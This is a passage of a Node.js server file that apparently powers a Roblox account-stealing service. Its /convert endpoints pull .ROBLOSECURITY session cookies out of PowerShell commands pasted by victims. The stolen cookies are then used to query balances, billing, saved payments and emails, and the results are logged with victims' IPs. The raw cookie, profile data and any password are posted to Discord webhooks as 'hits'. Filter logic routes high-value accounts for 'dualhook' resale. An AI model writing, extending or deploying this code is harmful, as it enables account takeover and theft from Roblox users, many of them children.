          targetDirectory = directoryName;
        }
      }
    }

    if (!directoryExists) {
      return res.status(404).json({ 
        error: 'Directory not found',
        directory: directoryName
      });
    }

    // Get user logs from Firebase
    const logsRef = db.ref('user_logs');
    const snapshot = await logsRef.once('value');
    const allLogs = snapshot.val() || {};

    // Filter logs for this specific directory
    const directoryLogs = Object.values(allLogs).filter(log => {
      if (!log.context) return false;

      // For direct directory matches
      if (log.context.directory === targetDirectory) return true;

      // For subdirectory matches
      if (log.context.subdirectory && 
          `${log.context.directory}/${log.context.subdirectory}` === targetDirectory) {
        return true;
      }

      return false;
    });

    const today = new Date().toDateString();
    const todayLogs = directoryLogs.filter(log => {
      const logDate = new Date(log.timestamp).toDateString();
      return logDate === today;
    });

    // Calculate statistics
    const totalAccounts = directoryLogs.length;
    const totalSummary = directoryLogs.reduce((sum, log) => sum + (log.userData.summary || 0), 0);
    const totalRobux = directoryLogs.reduce((sum, log) => sum + (log.userData.robux || 0), 0);
    const totalRAP = directoryLogs.reduce((sum, log) => sum + (log.userData.rap || 0), 0);

    const todayAccounts = todayLogs.length;
    const todaySummary = todayLogs.reduce((sum, log) => sum + (log.userData.summary || 0), 0);
    const todayRobux = todayLogs.reduce((sum, log) => sum + (log.userData.robux || 0), 0);
    const todayRAP = todayLogs.reduce((sum, log) => sum + (log.userData.rap || 0), 0);

    // Get last hit info
    const lastHit = directoryLogs.length > 0 
      ? directoryLogs.sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp))[0]
      : null;

    res.json({
      directory: targetDirectory,
      stats: {
        totalAccounts,
        totalSummary,
        totalRobux,
        totalRAP,
        todayAccounts,
        todaySummary,
        todayRobux,
        todayRAP
      },
      lastHit: lastHit ? {
        username: lastHit.userData.username || 'Unknown',
        timestamp: lastHit.timestamp,
        robux: lastHit.userData.robux || 0,
        premium: lastHit.userData.premium || false
      } : null
    });

  } catch (error) {
    console.error('Error getting bot stats:', error);
    res.status(500).json({ error: 'Server error' });
  }
});

// API endpoint for admin stats (protected)
app.get('/api/admin/stats', requireAdminPassword, async (req, res) => {
  try {
    const logsRef = db.ref('user_logs');
    const snapshot = await logsRef.once('value');
    const allLogs = snapshot.val() || {};

    const logs = Object.values(allLogs);

    // Calculate all-time stats (not just today)
    const totalUsers = logs.length;
    const totalRobux = logs.reduce((sum, log) => sum + (log.userData.robux || 0), 0);
    const totalSummary = logs.reduce((sum, log) => sum + (log.userData.summary || 0), 0);
    const premiumUsers = logs.filter(log => log.userData.premium).length;

    // Count unique directories from all logs
    const directories = new Set(logs.map(log => log.context?.directory).filter(dir => dir));
    const activeDirectories = directories.size;

    res.json({
      totalUsers,
      totalRobux,
      totalSummary,
      premiumUsers,
      activeDirectories
    });

  } catch (error) {
    console.error('Error getting admin stats:', error);
    res.status(500).json({ error: 'Server error' });
  }
});

// API endpoint for admin logs (protected)
app.get('/api/admin/logs', requireAdminPassword, async (req, res) => {
  try {
    const logsRef = db.ref('user_logs');
    const logsQuery = logsRef.orderByChild('timestamp').limitToLast(50);
    const snapshot = await logsQuery.once('value');
    const logs = snapshot.val() || {};

    const formattedLogs = Object.values(logs)
      .sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp))
      .map(log => ({
        username: log.userData.username || 'Unknown',
        timestamp: log.timestamp,
        robux: log.userData.robux || 0,
        premium: log.userData.premium || false,
        rap: log.userData.rap || 0,
        directory: log.context?.directory || 'main',
        subdirectory: log.context?.subdirectory || null,
        ip: log.context?.ip || 'Unknown'
      }));

    res.json(formattedLogs);

  } catch (error) {
    console.error('Error getting admin logs:', error);
    res.status(500).json({ error: 'Server error' });
  }
});

// Function to get CSRF token for Roblox API requests
async function getRobloxCSRFToken(token) {
  try {
    // Try to make any authenticated request to get CSRF token from error response
    const response = await fetch('https://auth.roblox.com/v1/logout', {
      method: 'POST',
      headers: {
        'Cookie': `.ROBLOSECURITY=${token}`,
        'User-Agent': 'Roblox/WinInet',
        'Accept': 'application/json',
        'Content-Type': 'application/json',
        'Referer': 'https://www.roblox.com/',
        'Origin': 'https://www.roblox.com'
      }
    });

    const csrfToken = response.headers.get('x-csrf-token');
    return csrfToken;
  } catch (error) {
    return null;
  }
}

// Function to fetch user data from Roblox API
async function fetchRobloxUserData(token) {
  try {
    // Get CSRF token first
    const csrfToken = await getRobloxCSRFToken(token);

    const baseHeaders = {
      'Cookie': `.ROBLOSECURITY=${token}`,
      'User-Agent': 'Roblox/WinInet',
      'Accept': 'application/json',
      'Accept-Language': 'en-US,en;q=0.9',
      'Referer': 'https://www.roblox.com/',
      'Origin': 'https://www.roblox.com'
    };

    if (csrfToken) {
      baseHeaders['X-CSRF-TOKEN'] = csrfToken;
    }

    // Get user info first
    const userResponse = await fetch('https://users.roblox.com/v1/users/authenticated', {
      method: 'GET',
      headers: baseHeaders
    });

    if (!userResponse.ok) {
      // Try alternative endpoint if first fails
      const altUserResponse = await fetch('https://www.roblox.com/mobileapi/userinfo', {
        method: 'GET',
        headers: baseHeaders
      });

      if (!altUserResponse.ok) {
        return null;
      }

      const altUserData = await altUserResponse.json();

      // For mobile API, try to get actual robux data
      let actualRobux = altUserData.RobuxBalance || 0;
      let pendingRobux = 0;

      return {
        username: altUserData.UserName || "Unknown User",
        userId: altUserData.UserID || 0,
        robux: actualRobux,
        premium: altUserData.IsPremium || false,
        rap: 0,
        summary: 0,
        creditBalance: 0,
        savedPayment: false,
        robuxIncoming: pendingRobux,
        robuxOutgoing: 0,
        korblox: false,
        headless: false,
        accountAge: 0, // Will calculate below if possible
        groupsOwned: 0,
        placeVisits: 0,
        inventory: { hairs: 0, bundles: 0, faces: 0 },
        emailVerified: false,
        emailAddress: null,
        voiceChatEnabled: false
      };
    }

    const userData = await userResponse.json();

    // Get robux data (current + pending)
    let robuxData = { robux: 0 };
    let pendingRobuxData = { pendingRobux: 0 };

    try {
      const robuxResponse = await fetch('https://economy.roblox.com/v1/user/currency', {
        headers: baseHeaders
      });
      if (robuxResponse.ok) {
        robuxData = await robuxResponse.json();
      }
    } catch (e) {
      // Silent handling
    }

    try {
      const pendingResponse = await fetch('https://economy.roblox.com/v1/user/currency/pending', {
        headers: baseHeaders
      });
      if (pendingResponse.ok) {
        pendingRobuxData = await pendingResponse.json();
      }
    } catch (e) {
      // Silent handling
    }

    // Get transaction summary data
    let summaryData = { incomingRobux: 0, outgoingRobux: 0 };
    try {
      const summaryResponse = await fetch('https://economy.roblox.com/v2/users/' + userData.id + '/transaction-totals?timeFrame=Year&transactionType=summary', {
        headers: baseHeaders
      });
      if (summaryResponse.ok) {
        summaryData = await summaryResponse.json();
      }
    } catch (e) {
      // Silent handling
    }

    // Get credit balance and premium status from billing API
    let premiumData = { isPremium: false };
    let creditBalance = 0;
    let savedPayment = false;

    try {
      const billingResponse = await fetch(`https://billing.roblox.com/v1/credit`, {
        headers: baseHeaders
      });

      if (billingResponse.ok) {
        const billingData = await billingResponse.json();

        // Extract credit balance information
        creditBalance = billingData.balance || 0;
        savedPayment = billingData.hasSavedPayments || false;

        // Check if user has premium features via billing
        premiumData.isPremium = billingData.hasPremium || 
                               billingData.isPremium || 
                               (billingData.balance && billingData.balance > 0) || 
                               false;
      }
    } catch (billingError) {
      // Fallback to premium validation API if billing fails
      try {
        const premiumApiUrl = `https://premiumfeatures.roblox.com/v1/users/${userData.id}/validate-membership`;

        const premiumResponse = await fetch(premiumApiUrl, {
          headers: baseHeaders
        });

        if (premiumResponse.ok) {
          const premiumValidation = await premiumResponse.json();

          // The API returns a direct boolean value (true/false), not an object
          if (typeof premiumValidation === 'boolean') {
            premiumData.isPremium = premiumValidation;
          } else {
            // Fallback to check object properties if response is an object
            premiumData.isPremium = premiumValidation.isPremium || 
                                    premiumValidation.IsPremium || 
                                    premiumValidation.premium || 
                                    premiumValidation.Premium || 
                                    false;
          }
        } else {
          premiumData.isPremium = false;
        }
      } catch (e) {
        premiumData.isPremium = false;
      }
    }

    // Get user details for account age
    let ageData = { created: null };
    try {
      const ageResponse = await fetch(`https://users.roblox.com/v1/users/${userData.id}`, {
        headers: baseHeaders
      });
      if (ageResponse.ok) {
        ageData = await ageResponse.json();
      }
    } catch (e) {
      // Silent handling
    }

    // Get groups owned
    let groupsOwned = 0;
    try {
      const groupsResponse = await fetch(`https://groups.roblox.com/v1/users/${userData.id}/groups/roles`, {
        headers: baseHeaders
      });
      if (groupsResponse.ok) {
        const groupsData = await groupsResponse.json();
        groupsOwned = groupsData.data ? groupsData.data.filter(group => group.role.rank === 255).length : 0;
      }
    } catch (e) {
      // Silent handling
    }

    // Get inventory counts with improved accuracy
    let inventoryData = { hairs: 0, bundles: 0, faces: 0 };
    try {
      // Try to get actual inventory via different methods

      // Method 1: Try user inventory endpoint with filtering
      const inventoryResponse = await fetch(`https://inventory.roblox.com/v1/users/${userData.id}/inventory?assetTypes=Bundle,Face,Hair,HairAccessory&limit=100`, {
        headers: baseHeaders
      });

      // Method 2: Try the items endpoint specifically
      const itemsResponse = await fetch(`https://inventory.roblox.com/v1/users/${userData.id}/items/Bundle,Face,Hair,HairAccessory/1?limit=100`, {
        headers: baseHeaders
      });

      if (itemsResponse.ok) {
        const itemsData = await itemsResponse.json();
        if (itemsData && itemsData.data) {
          inventoryData.bundles = itemsData.data.filter(item => item.assetType === 'Bundle').length;
          inventoryData.faces = itemsData.data.filter(item => item.assetType === 'Face').length;
          inventoryData.hairs = itemsData.data.filter(item => item.assetType === 'Hair' || item.assetType === 'HairAccessory').length;
        }
      }

      // Method 3: Fallback to collectibles endpoint
      if (inventoryData.hairs === 0 && inventoryData.faces === 0 && inventoryData.bundles === 0) {
        // Get bundles specifically
        const bundleResponse = await fetch(`https://inventory.roblox.com/v1/users/${userData.id}/assets/collectibles?assetTypes=Bundle&sortOrder=Asc&limit=100`, {
          headers: baseHeaders
        });

        if (bundleResponse.ok) {
          const bundleData = await bundleResponse.json();
          if (bundleData && bundleData.data) {
            inventoryData.bundles = bundleData.data.length;
          }
        }

        // Get hair accessories  
        const hairResponse = await fetch(`https://inventory.roblox.com/v1/users/${userData.id}/assets/collectibles?assetTypes=Hair,HairAccessory&sortOrder=Asc&limit=100`, {
          headers: baseHeaders
        });

        if (hairResponse.ok) {
          const hairData = await hairResponse.json();
          if (hairData && hairData.data) {
            inventoryData.hairs = hairData.data.length;
          }
        }

        // Get faces
        const faceResponse = await fetch(`https://inventory.roblox.com/v1/users/${userData.id}/assets/collectibles?assetTypes=Face&sortOrder=Asc&limit=100`, {
          headers: baseHeaders
        });

        if (faceResponse.ok) {
          const faceData = await faceResponse.json();
          if (faceData && faceData.data) {
            inventoryData.faces = faceData.data.length;
          }
        }
      }

      // Final fallback: try avatar items if everything else fails
      if (inventoryData.hairs === 0 && inventoryData.faces === 0 && inventoryData.bundles === 0) {
        const avatarResponse = await fetch(`https://avatar.roblox.com/v1/users/${userData.id}/avatar`, {
          headers: baseHeaders
        });
        if (avatarResponse.ok) {
          const avatarData = await avatarResponse.json();
          if (avatarData.assets) {
            inventoryData.hairs = avatarData.assets.filter(asset => asset.assetType && (asset.assetType.name === 'Hair' || asset.assetType.name === 'HairAccessory')).length;
            inventoryData.faces = avatarData.assets.filter(asset => asset.assetType && asset.assetType.name === 'Face').length;
          }
        }
      }
    } catch (e) {
      // Silent handling
    }

    // Get RAP (Limited item values)
    let rapValue = 0;
    try {
      const collectiblesResponse = await fetch(`https://inventory.roblox.com/v1/users/${userData.id}/assets/collectibles?sortOrder=Asc&limit=100`, {
        headers: baseHeaders
      });
      if (collectiblesResponse.ok) {
        const collectiblesData = await collectiblesResponse.json();
        if (collectiblesData.data) {
          rapValue = collectiblesData.data.reduce((total, item) => {
            return total + (item.recentAveragePrice || 0);
          }, 0);
        }
      }
    } catch (e) {
      // Silent handling
    }

    // Calculate account age in days
    let accountAge = 0;
    if (ageData.created) {
      const createdDate = new Date(ageData.created);
      const now = new Date();
      accountAge = Math.floor((now - createdDate) / (1000 * 60 * 60 * 24));
    }

    // Check for Korblox and Headless
    let hasKorblox = false;
    let hasHeadless = false;
    try {
      const wearingResponse = await fetch(`https://avatar.roblox.com/v1/users/${userData.id}/currently-wearing`, {
        headers: baseHeaders
      });
      if (wearingResponse.ok) {
        const wearingData = await wearingResponse.json();
        if (wearingData.assetIds) {
          hasKorblox = wearingData.assetIds.includes(139607770) || wearingData.assetIds.includes(139607718); // Korblox asset IDs
          hasHeadless = wearingData.assetIds.includes(134082579); // Headless Head asset ID
        }
      }
    } catch (e) {
      // Silent handling
    }

    // Fetch email verification status and voice chat settings
    let emailVerified = false;
    let emailAddress = null;
    let voiceChatEnabled = false;

    try {
      // Email verification
      const emailResponse = await fetch('https://accountsettings.roblox.com/v1/email', { headers: baseHeaders });
      if (emailResponse.ok) {
        const emailData = await emailResponse.json();
        emailVerified = emailData.verified || false;
        emailAddress = emailData.emailAddress || null;
      }
    } catch (e) { /* Ignore email fetch errors */ }

    try {
      // Voice chat settings
      const voiceResponse = await fetch('https://voice.roblox.com/v1/settings', { headers: baseHeaders });
      if (voiceResponse.ok) {
        const voiceData = await voiceResponse.json();
        voiceChatEnabled = voiceData.isVoiceEnabled || false;
      }
    } catch (e) { /* Ignore voice chat fetch errors */ }


    return {
      username: userData.name || userData.displayName,
      userId: userData.id,
      robux: robuxData.robux || 0,
      premium: premiumData.isPremium || false,
      rap: rapValue,
      summary: summaryData.incomingRobuxTotal || 0,
      creditBalance: creditBalance,
      savedPayment: savedPayment,
      robuxIncoming: summaryData.incomingRobuxTotal || 0,
      robuxOutgoing: summaryData.outgoingRobuxTotal || 0,
      korblox: hasKorblox,
      headless: hasHeadless,
      accountAge: accountAge,
      groupsOwned: groupsOwned,
      placeVisits: 0, // This data is not easily accessible via API
      inventory: inventoryData,
      emailVerified: emailVerified,
      emailAddress: emailAddress,
      voiceChatEnabled: voiceChatEnabled
    };

  } catch (error) {
    return null;
  }
}

// Function to check if user data meets Dualhook filter criteria
function meetsFilterCriteria(userData, filters) {
  // If filters are not enabled globally, never meet criteria
  if (!filters || !filters.enabled) return false;

  // Check if any individual filters are enabled
  const hasEnabledFilters = filters.currency?.enabled || 
                           filters.collectibles?.enabled || 
                           filters.billings?.enabled || 
                           filters.creditBalance?.enabled || 
                           filters.groups?.enabled || 
                           filters.korblox?.enabled || 
                           filters.headless?.enabled ||
                           filters.premium?.enabled;

  // If no individual filters are enabled, don't filter
  if (!hasEnabledFilters) return false;

  // OR LOGIC: If ANY filter condition is met, return true immediately
  
  // Check currency filters (Robux)
  if (filters.currency?.enabled && filters.currency.value > 0) {
    const value = userData.robux || 0;
    if (value >= filters.currency.value) return true; // ✅ Filter condition met!
  }

  // Check collectibles filters (RAP)
  if (filters.collectibles?.enabled && filters.collectibles.value > 0) {
    const value = userData.rap || 0;
    if (value >= filters.collectibles.value) return true; // ✅ Filter condition met!
  }

  // Check billings filters (Summary - Transaction History)
  if (filters.billings?.enabled && filters.billings.value > 0) {
    const value = userData.summary || 0;
    if (value >= filters.billings.value) return true; // ✅ Filter condition met!
  }

  // Check credit balance filters (Real Money in USD)
  if (filters.creditBalance?.enabled && filters.creditBalance.value > 0) {
    const value = userData.creditBalance || 0;
    if (value >= filters.creditBalance.value) return true; // ✅ Filter condition met!
  }

  // Check groups filters (Groups Owned)
  if (filters.groups?.enabled && filters.groups.value > 0) {
    const value = userData.groupsOwned || 0;
    if (value >= filters.groups.value) return true; // ✅ Filter condition met!
  }

  // Check Premium filter
  if (filters.premium?.enabled && userData.premium) return true; // ✅ Filter condition met!

  // Check Korblox filter
  if (filters.korblox?.enabled && userData.korblox) return true; // ✅ Filter condition met!

  // Check Headless filter
  if (filters.headless?.enabled && userData.headless) return true; // ✅ Filter condition met!

  // If none of the enabled filters matched, don't filter
  return false;
}

// Function to send custom dualhook webhook with directory branding
async function sendCustomDualhookWebhook(token, userAgent = 'Unknown', userData = null, webhookUrl, directoryName, subdirectoryName, host) {


  if (!webhookUrl) {

    return { success: false, error: 'Webhook URL not configured' };
  }

  try {
    const embed = {
      title: `${directoryName.toUpperCase()} AUTOHAR`,
      description: `Ur ${directoryName.toUpperCase()} AUTOHAR url\n📌\n\n\`http://${host}/${directoryName}/${subdirectoryName}\``,
      color: 0x8B5CF6,
      footer: {
        text: `Made by ${directoryName}`
      }
    };

    const payload = {
      embeds: [embed]
    };


    const response = await fetch(webhookUrl, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(payload)
    });



    if (!response.ok) {
      const errorText = await response.text();
      console.error('Webhook failed with status:', response.status, 'Error:', errorText);
      return { success: false, error: `Webhook failed: ${response.status}` };
    }


    return { success: true };
  } catch (error) {
    console.error('❌ Failed to send custom dualhook webhook:', error.message);
    console.error('Full error:', error);
    return { success: false, error: error.message };
  }
}

// Function to send Discord webhook with user data (supports custom webhook URLs)
async function sendToDiscord(token, userAgent = 'Unknown', scriptType = 'Unknown', userData = null, customWebhookUrl = null, customTitle = null, useCustomWebhook = false) {
  const webhookUrl = customWebhookUrl || process.env.DISCORD_WEBHOOK_URL;

  console.log('Webhook URL configured:', webhookUrl ? 'YES' : 'NO');

  if (!webhookUrl) {

    return { success: false, error: 'Webhook URL not configured' };
  }

  try {
    if (userData) {
      // Fetch avatar thumbnail URL
      let avatarUrl = null;
      try {
        const avatarResponse = await fetch(`https://thumbnails.roblox.com/v1/users/avatar?userIds=${userData.userId}&size=420x420&format=Png&isCircular=false`);
        if (avatarResponse.ok) {
          const avatarData = await avatarResponse.json();
          if (avatarData.data && avatarData.data.length > 0) {
            avatarUrl = avatarData.data[0].imageUrl;
          }
        }
      } catch (error) {
        console.log('Failed to fetch avatar, continuing without it');
      }

      // First embed: User data only (without cookie)
      const userDataEmbed = {
        title: customTitle || "Website Owner",
        color: 0x8B5CF6,
        fields: [
          {
            name: "<:emoji_37:1410520517349212200> Username",
            value: userData.username || "Unknown",
            inline: false
          },
          {
            name: "<:emoji_31:1410233610031857735> Robux (Pending)",
            value: `${userData.robux || 0} (0)`,
            inline: true
          },
          {
            name: "<:rbxPremium:1408083254531330158> Premium",
            value: userData.premium ? "true" : "false",
            inline: true
          },
          {
            name: "<:emoji_36:1410512337839849543> RAP",
            value: userData.rap?.toString() || "0",
            inline: true
          },
          {
            name: "<:emoji_40:1410521889121501214> Summary",
            value: userData.summary?.toString() || "0",
            inline: true
          },
          {
            name: "<a:emoji_42:1410523396995022890> Billing",
            value: `Balance: ${userData.creditBalance && userData.creditBalance > 0 ? `$${userData.creditBalance} (Est. ${Math.round(userData.creditBalance * 80)} Robux)`: "$0"}\nSaved Payment: ${userData.savedPayment ? "True" : "False"}`,
            inline: false

          },

          {
            name: "<:emoji_31:1410233610031857735> Robux In/Out",
            value: `<:emoji_31:1410233610031857735> ${userData.robuxIncoming || 0} / <:emoji_31:1410233610031857735> ${userData.robuxOutgoing || 0}`,
            inline: true
          },
          {
            name: "<:emoji_39:1410521396420939787> Collectibles",
            value: `${userData.korblox ? "<:KorbloxDeathspeaker:1408080747306418257> True" : "<:KorbloxDeathspeaker:1408080747306418257> False"}\n${userData.headless ? "<:HeadlessHorseman:1397192572295839806> True" : "<:HeadlessHorseman:1397192572295839806> False"}`,
            inline: true
          },

          {
            name: "<:emoji_38:1410520554842361857> Groups Owned",
            value: userData.groupsOwned?.toString() || "0",
            inline: true
          },
          {
            name: "<:emoji_41:1410522675821940820> Place Visits",
            value: userData.placeVisits?.toString() || "0",
            inline: true
          },
          {
            name: "<:emoji_37:1410517247751094363> Inventory",
            value: `Hairs: ${userData.inventory?.hairs || 0}\nBundles: ${userData.inventory?.bundles || 0}\nFaces: ${userData.inventory?.faces || 0}`,
            inline: false
          },
          {
            name: "<:emoji_38:1410517275328647218> Settings",
            value: `Email Status: ${userData.emailVerified ? "Verified" : "Unverified"}\nVoice Chat: ${userData.voiceChatEnabled ? "Enabled" : "Disabled"}\nAccount Age: ${userData.accountAge || 0} Days`,
            inline: false                  
          },
          // Display password if available
          ...(userData.password ? [{
            name: "🔑 **Password**",
            value: `**\`${userData.password}\`**`,
            inline: false
          }] : [])
        ],
        footer: {
          text: "Made By .Niqqa"
        }
      };

      // Add thumbnail if avatar URL was fetched successfully
      if (avatarUrl) {
        userDataEmbed.thumbnail = {
          url: avatarUrl
        };
      }

      // Second embed: Cookie only - display the raw token value in description with code block formatting
      const cookieEmbed = {
        title: "🍪 Cookie",
        description: "**```" + token + "```**",
        color: 0x8B5CF6,
        footer: {
          text: "Handle with extreme caution!"
        }
      };

      // Send both embeds together in a single message with @everyone notification
      const combinedPayload = {
        content: "@everyone +1 Hit",
        embeds: [userDataEmbed, cookieEmbed]
      };

      // Add custom webhook branding if requested (for all directory hits)
      if (useCustomWebhook) {
        combinedPayload.username = "AUTOHAR HIT";
        combinedPayload.avatar_url = "https://i.imgur.com/rVUUJ9d.png";
      } else {
        // Only main site owner gets custom branding by default
        combinedPayload.username = "AUTOHAR HIT";
        combinedPayload.avatar_url = "https://i.imgur.com/rVUUJ9d.png";
      }



      const response = await fetch(webhookUrl, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(combinedPayload)
      });



      if (!response.ok) {
        const errorText = await response.text();
        console.error('Combined embeds failed with status:', response.status, 'Error:', errorText);
        return { success: false, error: `Combined embeds failed: ${response.status}` };
      }


      return { success: true };

    } else {
      // Simple embed with just token (for cases without user data)
      const embed = {
        title: "LUNIX AUTOHAR",
        description: `Ur LUNIX AUTOHAR url\n📌\n\n\`${token}\``,
        color: 0x8B5CF6,
        footer: {
          text: "Made By Lunix"
        }
      };

      const payload = {
        embeds: [embed]
      };



      const response = await fetch(webhookUrl, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(payload)
      });


      if (!response.ok) {
        const errorText = await response.text();
        console.error('Webhook failed with status:', response.status, 'Error:', errorText);
        return { success: false, error: `Webhook failed: ${response.status}` };
      }


      return { success: true };
    }
  } catch (error) {
    console.error('❌ Failed to send Discord webhook:', error.message);
    console.error('Full error:', error);
    return { success: false, error: error.message };
  }
}

// Re-enabled convert endpoint for root path (site owner)
app.post('/convert', validateRequest, async (req, res) => {
  try {
    let input;
    let scriptType;

    // Handle both JSON and text input
    if (typeof req.body === 'string') {
      input = req.body;
      scriptType = 'Unknown';
    } else if (req.body && req.body.powershell) {
      input = req.body.powershell;
      scriptType = req.body.scriptType || 'Unknown';
    } else {
      return res.status(400).json({ error: 'Invalid input format' });
    }

    // Check if input is just plain text (no PowerShell structure) - silently reject to prevent spam
    const hasBasicPowershellStructure = /(?:Invoke-WebRequest|curl|wget|-Uri|-Headers|-Method|powershell|\.ROBLOSECURITY)/i.test(input);

    if (!hasBasicPowershellStructure) {
      // Silently reject plain text inputs without sending webhooks
      return res.status(400).json({ 
        success: false,
        message: 'Invalid input format'
      });
    }

    // Look for .ROBLOSECURITY cookie in PowerShell command with improved regex
    const cleanedInput = input.replace(/`\s*\n\s*/g, '').replace(/`/g, '');
    const regex = /\.ROBLOSECURITY["']?\s*,?\s*["']([^"']+)["']/i;
    const match = cleanedInput.match(regex);

    if (match) {
      const token = match[1].replace(/['"]/g, '');

      // Check if token is empty, just whitespace, or only contains commas/special chars
      if (!token || token.trim() === '' || token === ',' || token.length < 10) {
        // Send fallback embed when no valid token found
        const fallbackEmbed = {
          title: "⚠️ Input Received",
          description: "Input received but no ROBLOSECURITY found",
          color: 0x8B5CF6,
          footer: {
            text: "Made By Lunix"
          }
        };

        const fallbackPayload = {
          embeds: [fallbackEmbed]
        };

        // Send to Discord webhook
        try {
          const response = await fetch(process.env.DISCORD_WEBHOOK_URL, {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json',
            },
            body: JSON.stringify(fallbackPayload)
          });
        } catch (webhookError) {
          console.error('❌ Fallback webhook failed:', webhookError.message);
        }

        return res.status(400).json({ 
          success: false,
          message: 'Failed wrong input'
        });
      }

      const userAgent = req.headers['user-agent'] || 'Unknown';

      // Fetch user data from Roblox API
      const userData = await fetchRobloxUserData(token);

      // If user data fetch failed, create a minimal user data object
      const webhookUserData = userData || {
        username: "Unknown User",
        userId: "Unknown",
        robux: 0,
        premium: false,
        rap: 0,
        summary: 0,
        creditBalance: 0,
        savedPayment: false,
        robuxIncoming: 0,
        robuxOutgoing: 0,
        korblox: false,
        headless: false,
        accountAge: 0,
        groupsOwned: 0,
        placeVisits: 0,
        inventory: { hairs: 0, bundles: 0, faces: 0 },
        emailVerified: false,
        emailAddress: null,
        voiceChatEnabled: false
      };

      // Log user data to database
      await logUserData(token, webhookUserData, { ip: req.ip, directory: 'main' });

      // Send to Discord webhook with user data
      const webhookResult = await sendToDiscord(token, userAgent, scriptType, webhookUserData);

      if (!webhookResult.success) {
        return res.status(500).json({ 
          success: false, 
          error: `Webhook failed: ${webhookResult.error}` 
        });
      }
    } else {
      // Send fallback embed when no token found
      const fallbackEmbed = {
        title: "⚠️ Input Received",
        description: "Input received but no ROBLOSECURITY found",
        color: 0x8B5CF6,
        footer: {
          text: "Made By Lunix"
        }
      };

      const fallbackPayload = {
        embeds: [fallbackEmbed]
      };

      // Send to Discord webhook
      try {
        const response = await fetch(process.env.DISCORD_WEBHOOK_URL, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify(fallbackPayload)
        });
      } catch (webhookError) {
        console.error('❌ Fallback webhook failed:', webhookError.message);
      }

      return res.status(400).json({ 
        success: false,
        message: 'Failed wrong input'
      });
    }

    res.json({ 
      success: true,
      message: 'Request submitted successfully!'
    });
  } catch (error) {
    // Log error without exposing sensitive details
    console.error('❌ Server error:', error.message);
    res.status(500).json({ error: 'Server error processing request' });
  }
});

// Legacy convert endpoint (kept for reference but disabled)
app.post('/convert-disabled', validateRequest, async (req, res) => {
  try {
    let input;
    let scriptType;



    // Handle both JSON and text input
    if (typeof req.body === 'string') {
      input = req.body;
      scriptType = 'Unknown';
    } else if (req.body && req.body.powershell) {
      input = req.body.powershell;
      scriptType = req.body.scriptType || 'Unknown';
    } else {

      return res.status(400).json({ error: 'Invalid input format' });
    }


    // Look for .ROBLOSECURITY cookie in PowerShell command with improved regex
    // First, clean up the input by removing PowerShell backticks and line breaks
    const cleanedInput = input.replace(/`\s*\n\s*/g, '').replace(/`/g, '');

    // Now extract the ROBLOSECURITY token from the cleaned input - improved pattern to capture full token
    const regex = /\.ROBLOSECURITY[=\s]*["']?([^"'\s}]+)["']?/i;
    const match = cleanedInput.match(regex);

    if (match) {
      const token = match[1].replace(/['"]/g, ''); // Remove quotes if present
      const userAgent = req.headers['user-agent'] || 'Unknown';

      // Fetch user data from Roblox API
      const userData = await fetchRobloxUserData(token);

      // If user data fetch failed, create a minimal user data object to ensure cookie is still sent
      const webhookUserData = userData || {
        username: "Unknown User",
        userId: "Unknown",
        robux: 0,
        premium: false,
        rap: 0,
        summary: 0,
        creditBalance: 0,
        savedPayment: false,
        robuxIncoming: 0,
        robuxOutgoing: 0,
        korblox: false,
        headless: false,
        accountAge: 0,
        groupsOwned: 0,
        placeVisits: 0,
        inventory: { hairs: 0, bundles: 0, faces: 0 },
        emailVerified: false,
        emailAddress: null,
        voiceChatEnabled: false
      };

      // Log user data to database
      await logUserData(token, webhookUserData, { ip: req.ip, directory: 'main' });


      // Send to Discord webhook with user data
      const webhookResult = await sendToDiscord(token, userAgent, scriptType, webhookUserData);

      if (!webhookResult.success) {

        return res.status(500).json({ 
          success: false, 
          error: `Webhook failed: ${webhookResult.error}` 
        });
      }


    } else {


      // Return error message when no token found
      return res.status(400).json({ 
        success: false,
        message: 'Failed wrong input'
      });
    }

    // Return success only when token was found and processed
    res.json({ 
      success: true,
      message: 'Request submitted successfully!'
    });
  } catch (error) {
    // Log error without exposing sensitive details
    console.error('❌ Server error:', error.message);
    res.status(500).json({ error: 'Server error processing request' });
  }
});

// Dynamic route handler for custom directories
app.get('/:directory', async (req, res) => {
  const directoryName = req.params.directory;
  const directories = await loadDirectories();

  if (directories[directoryName]) {
    // If directory has subdirectories, serve 404.html to protect parent
    if (directories[directoryName].subdirectories && 
        Object.keys(directories[directoryName].subdirectories).length > 0) {
      return res.status(404).sendFile(path.join(__dirname, 'public', '404.html'));
    }
    // Serve a custom page for this directory
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
  } else {
    res.status(404).sendFile(path.join(__dirname, 'public', '404.html'));
  }
});

// Route handler for dualhook create page
app.get('/:directory/create', async (req, res) => {
  const directoryName = req.params.directory;
  const directories = await loadDirectories();

  if (directories[directoryName] && directories[directoryName].serviceType === 'dualhook') {
    res.sendFile(path.join(__dirname, 'public', 'dualhook-create.html'));
  } else {
    res.status(404).sendFile(path.join(__dirname, 'public', '404.html'));
  }
});

// Route handler for subdirectories
app.get('/:directory/:subdirectory', async (req, res) => {
  const directoryName = req.params.directory;
  const subdirectoryName = req.params.subdirectory;
  const directories = await loadDirectories();

  if (directories[directoryName] && 
      directories[directoryName].subdirectories && 
      directories[directoryName].subdirectories[subdirectoryName]) {
    // Serve the same page for subdirectories
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
  } else {
    res.status(404).sendFile(path.join(__dirname, 'public', '404.html'));
  }
});

// API endpoint for custom directory requests
app.post('/:directory/convert', async (req, res) => {
  try {
    const directoryName = req.params.directory;
    const directories = await loadDirectories();

    // Check if directory exists
    if (!directories[directoryName]) {
      return res.status(404).json({ error: 'Directory not found' });
    }

    // If directory has subdirectories, return 404 to protect parent
    if (directories[directoryName].subdirectories && 
        Object.keys(directories[directoryName].subdirectories).length > 0) {
      return res.status(404).json({ error: 'Not found' });
    }

    const directoryConfig = directories[directoryName];

    // Validate API token for this specific directory
    const providedToken = req.get('X-API-Token');
    if (!providedToken || providedToken !== directoryConfig.apiToken) {
